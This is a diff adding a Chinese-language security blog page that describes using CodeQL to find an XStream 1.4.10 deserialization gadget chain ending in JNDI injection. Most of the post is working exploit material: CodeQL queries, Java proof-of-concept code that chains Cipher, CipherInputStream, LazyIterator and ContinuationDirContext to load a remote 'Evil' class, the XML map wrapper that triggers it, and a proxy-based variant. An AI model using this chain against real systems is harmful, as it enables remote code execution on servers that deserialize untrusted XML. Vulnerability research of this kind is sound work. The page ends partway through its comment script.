@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            XStream: 我是如何使用codeql独立挖掘利用链的
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><p>本文记录我使用codeql挖掘xstream利用链的详细过程。</p>
+<p>需要准备用于codeql分析的jdk数据库，编译jdk教程与编译好的数据库都在这：<a target="_blank" rel="noopener" href="https://blog.csdn.net/mole_exp/article/details/122330521%E3%80%82%E6%88%91%E8%BF%99%E9%87%8C%E4%B9%9F%E6%98%AF%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8%E4%BD%9C%E8%80%85%E7%BC%96%E8%AF%91%E5%A5%BD%E7%9A%84%EF%BC%8Cjdk8u101%E3%80%82">https://blog.csdn.net/mole_exp/article/details/122330521。我这里也是直接使用作者编译好的，jdk8u101。</a></p>
+<p>一些要提前了解的知识点：</p>
+<p>1、<code>NamingManager#getContext</code>若前3个参数可控，则可以打jndi注入，版本限制8u191。</p>
+<p>2、codeql的path-problem路径分析。</p>
+<p>3、xstream 反序列化利用链的入口是hashCode，触发原理是当最外层的map对象被反序列化时，key会被put进map里，从而调用<code>key#hashCode</code>。</p>
+<p>本文用到的codeql规则有：</p>
+<p>1、查找所有能够到达jndi注入触发点的hashCode方法。</p>
+<p>2、找到一个类，该类有Iterator属性，且某个方法调用了Iterator#hasNext</p>
+<p>本次使用codeql，算是完全靠自己挖掘出链子了，有一些经验：</p>
+<p>1、路径查找时，两条不同路径，重复的节点很多。如两条路径都有10个节点，只有其中1个节点不同，那么这两条路径都是不同的。</p>
+<p>2、路径查找时， 判断两个节点是否通路，只通过类型判断，没有考虑当前节点能否控制下一个节点的值。（这取决于规则怎么写。</p>
+<p>3、codeql查询结果仍然需要人工筛选。</p>
+<h1 id="hashCode-jndi"><a href="#hashCode-jndi" class="headerlink" title="hashCode -&gt; jndi"></a>hashCode -&gt; jndi</h1><p>一开始，查找hashCode-&gt;jndi的路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line">@kind path-problem</span><br><span class="line">*/</span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Source extends Method&#123;</span><br><span class="line">    Source()&#123;</span><br><span class="line">        this.getQualifiedName().matches(&quot;%hashCode%&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Sink extends Method&#123;</span><br><span class="line">    Sink()&#123;</span><br><span class="line">        this.hasQualifiedName(&quot;com.sun.jndi.ldap&quot;, &quot;LdapCtx&quot;, &quot;c_lookup&quot;)</span><br><span class="line">        or </span><br><span class="line">        this.hasQualifiedName(&quot;com.sun.jndi.toolkit.ctx&quot;, &quot;ComponentContext&quot;, &quot;p_lookup&quot;)</span><br><span class="line">        or </span><br><span class="line">        this.hasQualifiedName(&quot;com.sun.jndi.toolkit.ctx&quot;, &quot;PartialCompositeContext&quot;, &quot;lookup&quot;)</span><br><span class="line">        or </span><br><span class="line">        this.hasQualifiedName(&quot;com.sun.jndi.toolkit.url&quot;, &quot;GenericURLContext&quot;, &quot;lookup&quot;)</span><br><span class="line">        or </span><br><span class="line">        this.hasQualifiedName(&quot;com.sun.jndi.url.ldap&quot;, &quot;ldapURLContext&quot;, &quot;lookup&quot;)</span><br><span class="line">        or </span><br><span class="line">        this.hasQualifiedName(&quot;javax.naming&quot;, &quot;InitialContext&quot;, &quot;lookup&quot;)</span><br><span class="line">        or </span><br><span class="line">        this.hasQualifiedName(&quot;com.sun.jndi.toolkit.ctx&quot;, &quot;ComponentContext&quot;, &quot;c_lookup&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query predicate edges(Method a, Method b) &#123; </span><br><span class="line">    a.polyCalls(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Source source, Sink sink</span><br><span class="line">where edges+(source, sink)</span><br><span class="line">select source, source, sink, &quot;$@ $@ to $@ $@&quot; ,</span><br><span class="line">source.getDeclaringType(),source.getDeclaringType().getName(),</span><br><span class="line">source,source.getName(),</span><br><span class="line">sink.getDeclaringType(),sink.getDeclaringType().getName(),</span><br><span class="line">sink,sink.getName()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>结果有很多，几千个，但是总结起来有这些问题：</p>
+<p>1、路径重复的节点很多，如两条路径都有10个节点，只有其中1个节点不同，那么这两条路径都是不同的。如下：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/xstream-codeql/image-20240310130012316.png" alt="image-20240310130012316.png"></p>
+<p>2、我上面的ql判断两个节点通不通，只通过类型判断，没有考虑当前节点能否控制下一个节点的值。</p>
+<p>如：<code>ObjectAdapterIdBase#hashCode</code>，确实是调用了<code>Iterator#hasNext</code>。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/xstream-codeql/image-20240310130300024.png" alt="image-20240310130300024.png"></p>
+<p>看看iter从哪里获得：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/xstream-codeql/image-20240310130603656.png" alt="image-20240310130603656.png"></p>
+<p>后面就不想继续跟了，这个值大概率是无法任意控制的。</p>
+<h2 id="getTargetContext-jndi"><a href="#getTargetContext-jndi" class="headerlink" title="getTargetContext -&gt; jndi"></a>getTargetContext -&gt; jndi</h2><p>所以再对结果人工筛选，找到这条：（注意看，结果有18页。若能写出更精细的规则就好了）</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/xstream-codeql/image-20240310105253631.png" alt="image-20240310105253631.png"></p>
+<p>看<code>getTargetContext</code>。在这个方法里，codeql查的下一跳是ctx.lookup。但在这上面，有一个<code>NamingManager#getContext</code></p>
+<p>其实这就是一个jndi sink点，且cpe属性可完全控制。既然有了getContext，就没必要继续往下了。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/xstream-codeql/image-20240310105427000.png" alt="image-20240310105427000.png"></p>
+<p>初步构造，打通<code>getTargetContext -&gt; jndi</code>。jdk版本是能打ldap jndi的版本，也就是8u191之前。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static Object test_getTargetContext() throws Exception&#123;</span><br><span class="line">    CompositeName compositeName = new CompositeName(&quot;Foo&quot;);</span><br><span class="line">    Reference reference = new Reference(&quot;Evil&quot;,&quot;Evil&quot;, &quot;http://127.0.0.1:8000/&quot;);</span><br><span class="line">    RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry(&quot;any&quot;, 10991);</span><br><span class="line">    RegistryContext registryContext = Util.createWithoutConstructor(RegistryContext.class);</span><br><span class="line"></span><br><span class="line">    Hashtable&lt;Object, Object&gt; environment = new Hashtable&lt;&gt;();</span><br><span class="line">    Util.setFieldValue(registryContext,&quot;registry&quot;,registry);</span><br><span class="line">    Util.setFieldValue(registryContext,&quot;host&quot;,&quot;any&quot;);</span><br><span class="line">    Util.setFieldValue(registryContext,&quot;port&quot;,1099);</span><br><span class="line">    Util.setFieldValue(registryContext,&quot;environment&quot;,environment);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; continuationDirContextClass = Class.forName(&quot;javax.naming.spi.ContinuationDirContext&quot;);</span><br><span class="line">    Object continuationDirContext = Util.createWithoutConstructor(continuationDirContextClass);</span><br><span class="line">    CannotProceedException cpe = Util.createWithoutConstructor(CannotProceedException.class);</span><br><span class="line">    Util.setFieldValue(cpe,&quot;resolvedObj&quot;,reference);</span><br><span class="line">    Util.setFieldValue(cpe,&quot;altName&quot;,compositeName);</span><br><span class="line">    Util.setFieldValue(cpe,&quot;altNameCtx&quot;,registryContext);</span><br><span class="line"></span><br><span class="line">    Util.setFieldValue(continuationDirContext,&quot;env&quot;,environment);</span><br><span class="line">    Util.setFieldValue(continuationDirContext,&quot;cpe&quot;,cpe);</span><br><span class="line"></span><br><span class="line">    Method getTargetContext = Util.getMethod(continuationDirContextClass, &quot;getTargetContext&quot;, new Class[]&#123;Name.class&#125;);</span><br><span class="line">    getTargetContext.invoke(continuationDirContext,new CompositeName(&quot;Foo&quot;));</span><br><span class="line">    return continuationDirContext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/xstream-codeql/image-20240310131438140.png" alt="image-20240310131438140.png"></p>
+<p>调用栈：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/xstream-codeql/image-20240310131646003.png" alt="image-20240310131646003.png"></p>
+<p>然后现在就要把中间的链子补充完整。</p>
+<h2 id="hasNext-getTargetContext"><a href="#hasNext-getTargetContext" class="headerlink" title="hasNext -&gt; getTargetContext"></a>hasNext -&gt; getTargetContext</h2><p>测试 <code>findNextMatch -&gt; getTargetContext</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static Object test_findNextMatch() throws Exception&#123;</span><br><span class="line">    Object continuationDirContext = test_getTargetContext();</span><br><span class="line"></span><br><span class="line">    LazySearchEnumerationImpl lazySearchEnumerationImpl = Util.createWithoutConstructor(LazySearchEnumerationImpl.class);</span><br><span class="line">    RegistryContext registryContext = Util.createWithoutConstructor(RegistryContext.class);</span><br><span class="line">    ContextEnumerator contextEnumerator = Util.createWithoutConstructor(ContextEnumerator.class);</span><br><span class="line"></span><br><span class="line">    Util.setFieldValue(contextEnumerator,&quot;root&quot;,continuationDirContext);</span><br><span class="line"></span><br><span class="line">    Util.setFieldValue(lazySearchEnumerationImpl,&quot;candidates&quot;,contextEnumerator);</span><br><span class="line">    return lazySearchEnumerationImpl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>hasNext -&gt; findNextMatch</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    public static void poc1() throws Exception&#123;</span><br><span class="line">        Object o = test_findNextMatch();</span><br><span class="line">        LazySearchEnumerationImpl enums[] = new LazySearchEnumerationImpl[]&#123;(LazySearchEnumerationImpl)o,(LazySearchEnumerationImpl)o&#125;;</span><br><span class="line">        CompoundEnumeration&lt;SearchResult&gt; objectCompoundEnumeration = new CompoundEnumeration(enums);</span><br><span class="line"></span><br><span class="line">        Iterator lazyIterator = (Iterator)Util.createWithoutConstructor(Class.forName(&quot;com.sun.xml.internal.ws.policy.privateutil.ServiceFinder$LazyIterator&quot;));</span><br><span class="line">        Util.setFieldValue(lazyIterator,&quot;configs&quot;,objectCompoundEnumeration);</span><br><span class="line">//        lazyIterator.hasNext();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>所以现在我们就有了<code>hasNext -&gt; jndi </code>。</p>
+<p>lazyIterator是个Iterator，要找个任意可控Iterator的地方。</p>
+<p>我再在上面的18页结果里找，找的都无法任意可控Iterator。</p>
+<p>该写规则了。</p>
+<h2 id="hashCode-hasNext"><a href="#hashCode-hasNext" class="headerlink" title="hashCode -&gt; hasNext"></a>hashCode -&gt; hasNext</h2><p>找到一个类，这个类有Iterator属性，且某个方法调用了Iterator#hasNext，那么这个Iterator大概率就是类属性，可以任意设置。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 找到属性中含有某种类型的类</span><br><span class="line">class HasIteratorClass extends RefType&#123;</span><br><span class="line">    HasIteratorClass()&#123;</span><br><span class="line">        getAField().getType().getName().matches(&quot;Iterator%&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HasNextMethodAccess extends MethodAccess&#123;</span><br><span class="line">    HasNextMethodAccess()&#123;</span><br><span class="line">        exists(HasIteratorClass h |  </span><br><span class="line">            getMethod().getQualifiedName().matches(&quot;java.util.Iterator%hasNext&quot;)</span><br><span class="line">            and</span><br><span class="line">            getCaller().getDeclaringType() = h</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Sink extends Method&#123;</span><br><span class="line">    Sink()&#123;</span><br><span class="line">        exists(HasNextMethodAccess h |  this = h.getCaller() )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Source extends Method&#123;</span><br><span class="line">    Source()&#123;</span><br><span class="line">        this.getQualifiedName().matches(&quot;%hashCode%&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query predicate edges(Method a, Method b) &#123; </span><br><span class="line">    a.polyCalls(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Sink sink</span><br><span class="line">select sink,sink.getQualifiedName()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/xstream-codeql/image-20240310110132551.png" alt="image-20240310110132551.png"></p>
+<p>有很多，分批与hashCode求path，因为我试过若直接全部一起求，太慢了，10几分钟还出不来。</p>
+<p>看xstearm分析文章时，对javax.crypto有印象，所以拿他开刀了。</p>
+<p>只选javax.crypto下的类，求出路径。</p>
+<p>其中，我在Source和edges中做了别的限制，为了加快速度，因为经过人工筛后很多结果都有这些玩意，但这些一点用都没有，不如跳过。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line">@kind path-problem</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 找到属性中含有某种类型的类</span><br><span class="line">class HasIteratorClass extends RefType&#123;</span><br><span class="line">    HasIteratorClass()&#123;</span><br><span class="line">        getAField().getType().getName().matches(&quot;Iterator%&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class HasNextMethodAccess extends MethodAccess&#123;</span><br><span class="line">    HasNextMethodAccess()&#123;</span><br><span class="line">        exists(HasIteratorClass h |  </span><br><span class="line">            getMethod().getQualifiedName().matches(&quot;java.util.Iterator%hasNext&quot;)</span><br><span class="line">            and</span><br><span class="line">            getCaller().getDeclaringType() = h</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Sink extends Method&#123;</span><br><span class="line">    Sink()&#123;</span><br><span class="line">        exists(HasNextMethodAccess h |  </span><br><span class="line">            this = h.getCaller() </span><br><span class="line">            and</span><br><span class="line">            this.getDeclaringType().getQualifiedName().matches(&quot;javax.crypto%&quot;)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Source extends Method&#123;</span><br><span class="line">    Source()&#123;</span><br><span class="line">        this.getQualifiedName().matches(&quot;%hashCode%&quot;)</span><br><span class="line">        and</span><br><span class="line">        not this.getDeclaringType().getName().matches(&quot;%AbstractMap%&quot;)</span><br><span class="line">        and </span><br><span class="line">        not this.getDeclaringType().getName().matches(&quot;%AbstractSet%&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query predicate edges(Method a, Method b) &#123; </span><br><span class="line">    not b.getDeclaringType().getName().matches(&quot;%ObjectAdapterIdBase%&quot;) </span><br><span class="line">    and</span><br><span class="line">    not b.getDeclaringType().getName().matches(&quot;%PrintStream%&quot;) </span><br><span class="line">    and</span><br><span class="line">    not b.getDeclaringType().getName().matches(&quot;%AbstractSet%&quot;) </span><br><span class="line">    and</span><br><span class="line">    a.polyCalls(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from Source source, Sink sink</span><br><span class="line">where edges+(source, sink)</span><br><span class="line">select source, source, sink, &quot;$@ $@ to $@ $@&quot; ,</span><br><span class="line">source.getDeclaringType(),source.getDeclaringType().getName(),</span><br><span class="line">source,source.getName(),</span><br><span class="line">sink.getDeclaringType(),sink.getDeclaringType().getName(),</span><br><span class="line">sink,sink.getName()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>同样需要人工筛选，最终看到这一条</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/xstream-codeql/image-20240310104752270.png" alt="image-20240310104752270.png"></p>
+<p>已知chooseFirstProvider必定能到达可控Iterator的hasNext。</p>
+<p>补全上面的利用链，至此<code>hashCode-&gt;hasNext</code>这块拼图最终拼上。</p>
+<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><p>然后是序列化。xstream版本1.4.10</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        Object o = test_findNextMatch();</span><br><span class="line">        LazySearchEnumerationImpl enums[] = new LazySearchEnumerationImpl[]&#123;(LazySearchEnumerationImpl) o, (LazySearchEnumerationImpl) o&#125;;</span><br><span class="line">        CompoundEnumeration&lt;SearchResult&gt; objectCompoundEnumeration = new CompoundEnumeration(enums);</span><br><span class="line"></span><br><span class="line">        Iterator lazyIterator = (Iterator) Util.createWithoutConstructor(Class.forName(&quot;com.sun.xml.internal.ws.policy.privateutil.ServiceFinder$LazyIterator&quot;));</span><br><span class="line">        Util.setFieldValue(lazyIterator, &quot;configs&quot;, objectCompoundEnumeration);</span><br><span class="line"></span><br><span class="line">        Cipher cipher = Util.createWithoutConstructor(Cipher.class);</span><br><span class="line">        CipherInputStream cipherInputStream = Util.createWithoutConstructor(CipherInputStream.class);</span><br><span class="line">        CipherInputStream cipherInputStream2 = Util.createWithoutConstructor(CipherInputStream.class);</span><br><span class="line">        Base64Data base64Data = Util.createWithoutConstructor(Base64Data.class);</span><br><span class="line">        DataHandler dataHandler = Util.createWithoutConstructor(DataHandler.class);</span><br><span class="line">        DataSource dataSource = (DataSource) Util.createWithoutConstructor(Class.forName(&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;));</span><br><span class="line"></span><br><span class="line">        NativeString nativeString = Util.createWithoutConstructor(NativeString.class);</span><br><span class="line"></span><br><span class="line">        byte[] ibuffer = new byte[512];</span><br><span class="line"></span><br><span class="line">        Util.setFieldValue(cipher, &quot;serviceIterator&quot;, lazyIterator);</span><br><span class="line">        Util.setFieldValue(cipher, &quot;lock&quot;, &quot;asddd&quot;);</span><br><span class="line">        Util.setFieldValue(cipher, &quot;opmode&quot;, 1);</span><br><span class="line">        Util.setFieldValue(cipher, &quot;initialized&quot;, true);</span><br><span class="line">        Util.setFieldValue(cipherInputStream2, &quot;done&quot;, true);</span><br><span class="line">        Util.setFieldValue(cipherInputStream, &quot;cipher&quot;, cipher);</span><br><span class="line">        Util.setFieldValue(cipherInputStream, &quot;input&quot;, cipherInputStream2);</span><br><span class="line">        Util.setFieldValue(cipherInputStream, &quot;ibuffer&quot;, ibuffer);</span><br><span class="line">        Util.setFieldValue(dataSource, &quot;is&quot;, cipherInputStream);</span><br><span class="line">        Util.setFieldValue(dataHandler, &quot;dataSource&quot;, dataSource);</span><br><span class="line">        Util.setFieldValue(base64Data, &quot;dataHandler&quot;, dataHandler);</span><br><span class="line">        Util.setFieldValue(nativeString, &quot;value&quot;, base64Data);</span><br><span class="line"></span><br><span class="line">        XStream xStream = new XStream(new DomDriver());</span><br><span class="line"></span><br><span class="line">        System.out.println(xStream.toXML(nativeString));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/xstream-codeql/image-20240310135019010.png" alt="image-20240310135019010.png"></p>
+<p>注意直接这样反序列化是不行的，最外层必须包一个map，才会触发map#put，进而触发hashCode。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">	&lt;entry&gt;</span><br><span class="line">	//上面的结果复制到这里</span><br><span class="line">	&lt;string&gt;asd&lt;/string&gt;</span><br><span class="line">	&lt;/entry&gt;</span><br><span class="line">&lt;/map&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/xstream-codeql/image-20240310124228617.png" alt="image-20240310124228617.png"></p>
+<p>调用栈：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/xstream-codeql/image-20240310104722077.png" alt="image-20240310104722077.png"></p>
+<h1 id="究极3层动态代理"><a href="#究极3层动态代理" class="headerlink" title="究极3层动态代理"></a>究极3层动态代理</h1><p>这一部分属于是番外。</p>
+<p>自从学了Spring链，对动态代理爱不释手，所以在上面寻找可控Iterator的过程中，想到了用动态代理。</p>
+<p>关于AnnotationInvocationHandler这个动态代理的作用：</p>
+<blockquote>
+<p><strong>令某个方法返回任意对象</strong>。这个对象也可以是动态代理对象，只需要实现返回值的接口即可。</p>
+<p><a target="_blank" rel="noopener" href="https://unk.org.cn/2024/02/23/spring-unser1/#AnnotationInvocationHandler">https://unk.org.cn/2024/02/23/spring-unser1/#AnnotationInvocationHandler</a></p>
+</blockquote>
+<p>注意jdk版本要低一些，这里使用8u66。原因也在分析spring时说明了。</p>
+<p>测试过程发现，<code>AnnotationInvocationHandler#invoke</code>中</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/xstream-codeql/image-20240310144342954.png" alt="image-20240310144342954.png"></p>
+<p>动态代理的hashCode方法会进入hashCodeImpl，来看看这里面有什么</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/xstream-codeql/image-20240310144432083.png" alt="image-20240310144432083.png"></p>
+<p>现成的<code>hashCode-&gt;Iterator#hasNext</code>。</p>
+<p>如何令返回的Iterator就是lazyIterator?</p>
+<p>令当前proxy是proxy0，memberValues是proxy1。</p>
+<p>proxy1的memberValue是一个map，keyValue是：entrySet -&gt; proxy2。</p>
+<p>proxy2的memberValue是一个map，keyValue是：Iterator-&gt; lazyIterator。</p>
+<p>和Spring链一模一样的配方。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void poc1() throws Exception&#123;</span><br><span class="line">    Object o = test_findNextMatch();</span><br><span class="line">    LazySearchEnumerationImpl enums[] = new LazySearchEnumerationImpl[]&#123;(LazySearchEnumerationImpl)o,(LazySearchEnumerationImpl)o&#125;;</span><br><span class="line">    CompoundEnumeration&lt;SearchResult&gt; objectCompoundEnumeration = new CompoundEnumeration(enums);</span><br><span class="line"></span><br><span class="line">    Iterator lazyIterator = (Iterator)Util.createWithoutConstructor(Class.forName(&quot;com.sun.xml.internal.ws.policy.privateutil.ServiceFinder$LazyIterator&quot;));</span><br><span class="line">    Util.setFieldValue(lazyIterator,&quot;configs&quot;,objectCompoundEnumeration);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;();</span><br><span class="line">    hashMap1.put(&quot;iterator&quot;,lazyIterator);</span><br><span class="line">    Object handler1 = Gadget.getAnnotationInvocationHandler(hashMap1);</span><br><span class="line">    Object o1 = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;Set.class&#125;,(InvocationHandler) handler1);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;();</span><br><span class="line">    hashMap2.put(&quot;entrySet&quot;,o1);</span><br><span class="line">    Object handler2 = Gadget.getAnnotationInvocationHandler(hashMap2);</span><br><span class="line">    Map o2 = (Map)Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), HashMap.class.getInterfaces(),(InvocationHandler) handler2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Object handler3 = Gadget.getAnnotationInvocationHandler(o2);</span><br><span class="line">    Object o3 = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;&#125;,(InvocationHandler) handler3);</span><br><span class="line"></span><br><span class="line">    o3.hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>序列化的结果注意也要和上面一样用map包起来。至于为什么不new一个HashMap，put进去后再序列化，因为put会触发hashCode，打通了链子，链子上一些变量被改变了，再去序列化结果就不对了。当然了，把被改变的变量手动改回去就行了，试过了，可行。</p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E8%A6%81"><span class="toc-text">概要</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#hashCode-jndi"><span class="toc-text">hashCode -&gt; jndi</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#getTargetContext-jndi"><span class="toc-text">getTargetContext -&gt; jndi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hasNext-getTargetContext"><span class="toc-text">hasNext -&gt; getTargetContext</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hashCode-hasNext"><span class="toc-text">hashCode -&gt; hasNext</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">序列化与反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A9%B6%E6%9E%813%E5%B1%82%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-text">究极3层动态代理</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
